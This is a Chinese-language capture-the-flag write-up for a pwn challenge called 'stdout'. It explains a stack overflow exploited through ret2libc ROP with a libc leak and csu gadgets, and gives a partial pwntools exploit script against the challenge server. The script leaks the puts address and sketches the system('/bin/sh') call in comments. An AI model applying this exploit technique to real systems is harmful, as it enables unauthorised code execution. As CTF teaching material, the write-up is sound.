# stdout

> 分类：Pwn

## 题目描述

栈溢出 + ROP 题。main 函数调用 vuln 函数，vuln 存在栈溢出，通过 ROP 泄露 libc 地址，再调用 system 执行命令。

## 考察知识点

- 栈溢出
- ROP（ret2libc）
- libc 地址泄露
- csu gadget

## 解法

1. 查看保护，IDA 分析 main 函数，发现溢出 0x10 字节可覆盖 rbp+ret_addr，vuln 溢出很长。
2. 思路：主函数调用 vuln，通过 ROP 泄露 libc 地址，利用 system 执行任意命令。

```python
from pwn import *

p = remote("8.147.128.54", 20215)
elf = ELF('./pwn')
libc = ELF('./libc-2.31.so')

def send_payload(payload):
    p.send(b'\x00' * (0x50 + 0x8) + p64(0x40125D))
    sleep(1)
    p.send(payload)
    sleep(1)

rdi_ret = 0x00000000004013d3
ret = 0x000000000040101a
rsi_r15_ret = 0x00000000004013d1
csu_rear = 0x4013CA
csu_head = 0x4013B0
bss = 0x4041a0
start = 0x401130
read_plt = elf.plt['read']
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']

# Leak puts address
payload = b'\x00' * (0x20 + 0x8) + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(start)
send_payload(payload)
# ... 通过 csu gadget 向 bss 写入 /bin/sh，再泄露 libc 基址
# libcbase = leak_add - libc.symbols['puts']
# system = libcbase + libc.symbols['system']
# 最终 p64(rdi_ret) + p64(str_bin_sh) + p64(system)

p.interactive()
```

完整 exp 见原 writeup（含 csu 调用链和多次泄露基址）。

## 参考答案

（flag 通过 ret2libc 拿到 shell 后读取）

## 来源

- 作者：花草木_逆向小白 | https://blog.csdn.net/qq_67760645/article/details/140244620
